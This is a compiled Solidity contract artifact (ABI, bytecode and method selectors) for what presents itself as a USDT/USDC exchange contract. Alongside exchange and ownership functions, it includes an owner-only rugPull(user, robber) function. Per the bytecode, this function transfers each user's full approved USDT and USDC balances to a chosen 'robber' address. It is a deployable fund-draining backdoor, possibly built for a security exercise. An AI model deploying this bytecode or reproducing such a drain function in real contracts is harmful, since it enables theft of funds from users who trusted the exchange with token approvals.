{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract IERC20",
          "name": "token0",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "exchange",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getOwner",
      "outputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "contract IERC20",
          "name": "_usdt",
          "type": "address"
        },
        {
          "internalType": "contract IERC20",
          "name": "_usdc",
          "type": "address"
        }
      ],
      "name": "initialize",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "initialized",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "robber",
          "type": "address"
        }
      ],
      "name": "rugPull",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdc",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdt",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b506107f6806100206000396000f3fe608060405234801561001057600080fd5b50600436106100885760003560e01c806347597f2e1161005b57806347597f2e14610107578063485cc9551461011a578063893d20e81461012d578063f2fde38b1461014257600080fd5b8063045d03891461008d578063158ef93e146100a25780632f48ab7d146100c45780633e413bee146100f4575b600080fd5b6100a061009b3660046106dc565b610155565b005b6000546100af9060ff1681565b60405190151581526020015b60405180910390f35b6000546100dc9061010090046001600160a01b031681565b6040516001600160a01b0390911681526020016100bb565b6001546100dc906001600160a01b031681565b6100a0610115366004610708565b6102f4565b6100a0610128366004610708565b610554565b6000805160206107a1833981519152546100dc565b6100a0610150366004610741565b6105d9565b6000546001600160a01b0383811661010090920416148061018357506001546001600160a01b038381169116145b6101c45760405162461bcd60e51b815260206004820152600d60248201526c34b73b30b634b2103a37b5b2b760991b60448201526064015b60405180910390fd5b600080546001600160a01b0384811661010090920416146101f55760005461010090046001600160a01b0316610202565b6001546001600160a01b03165b6040516323b872dd60e01b8152336004820152306024820152604481018490529091506001600160a01b038416906323b872dd906064016020604051808303816000875af1158015610258573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061027c9190610765565b5060405163a9059cbb60e01b8152336004820152602481018390526001600160a01b0382169063a9059cbb906044016020604051808303816000875af11580156102ca573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102ee9190610765565b50505050565b6000805160206107a1833981519152546001600160a01b0316336001600160a01b0316146103645760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657260448201526064016101bb565b6001546040516370a0823160e01b81526001600160a01b038481166004830152909116906323b872dd908490849084906370a0823190602401602060405180830381865afa1580156103ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103de9190610787565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303816000875af1158015610432573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104569190610765565b506000546040516370a0823160e01b81526001600160a01b038481166004830152610100909204909116906323b872dd908490849084906370a0823190602401602060405180830381865afa1580156104b3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104d79190610787565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303816000875af115801561052b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061054f9190610765565b505050565b60005460ff161561059d5760405162461bcd60e51b8152602060048201526013602482015272185b1c9958591e481a5b9a5d1a585b1a5e9959606a1b60448201526064016101bb565b6000805460016001600160a81b03199091166101006001600160a01b039586160217811790915580546001600160a01b03191691909216179055565b6000805160206107a1833981519152546001600160a01b0316336001600160a01b0316146106495760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657260448201526064016101bb565b6001600160a01b0381166106ae5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084016101bb565b6106c4816000805160206107a183398151915255565b50565b6001600160a01b03811681146106c457600080fd5b600080604083850312156106ef57600080fd5b82356106fa816106c7565b946020939093013593505050565b6000806040838503121561071b57600080fd5b8235610726816106c7565b91506020830135610736816106c7565b809150509250929050565b60006020828403121561075357600080fd5b813561075e816106c7565b9392505050565b60006020828403121561077757600080fd5b8151801515811461075e57600080fd5b60006020828403121561079957600080fd5b505191905056fea7b53796fd2d99cb1f5ae019b54f9e024446c3d12b483f733ccc62ed04eb126ba2646970667358221220627e4399e0dd946ed197159649c1461aae61b1f5e35495909bcc32afca24546964736f6c63430008130033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "exchange(address,uint256)": "045d0389",
    "getOwner()": "893d20e8",
    "initialize(address,address)": "485cc955",
    "initialized()": "158ef93e",
    "rugPull(address,address)": "47597f2e",
    "transferOwnership(address)": "f2fde38b",
    "usdc()": "3e413bee",
    "usdt()": "2f48ab7d"
  },
  "id": 22
}